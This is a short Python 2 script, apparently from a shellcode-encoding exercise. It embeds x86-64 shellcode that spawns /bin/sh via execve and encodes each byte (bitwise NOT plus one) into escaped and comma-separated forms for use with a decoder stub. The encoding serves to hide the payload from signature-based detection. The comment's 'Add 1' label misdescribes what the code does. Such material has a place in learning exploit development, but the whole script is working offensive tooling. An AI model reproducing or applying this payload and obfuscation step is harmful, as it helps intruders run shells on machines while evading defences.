#!/usr/bin/python

# Python Add 1 Encoder

shellcode = ("\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05")

encoded = ""
encoded2 = ""

print 'Encoded shellcode ...'

for x in bytearray(shellcode) :
	# Add 1 Encoding
	y= ~x

	encoded += '\\x'
	encoded += '%02x' % ((y & 0xff) + 1)

	encoded2 += '0x'
	encoded2 += '%02x,' % ((y & 0xff) + 1)


print encoded

print encoded2

print 'Len: %d' % len(bytearray(shellcode))
